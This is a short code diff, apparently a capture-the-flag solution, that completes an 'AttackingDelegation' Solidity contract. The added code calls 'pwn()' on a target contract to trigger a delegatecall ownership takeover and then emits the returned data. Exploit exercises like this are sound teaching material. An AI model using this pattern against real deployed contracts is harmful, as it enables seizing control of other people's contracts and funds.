@@ -8,8 +8,11 @@ contract AttackingDelegation {
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
-
+    event dataexport(bytes);
     function hackContract() external {
         // Code me!
+        (bool success, bytes memory data) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+        emit dataexport(data);
+        require(success, "Failed!");
     }
 }
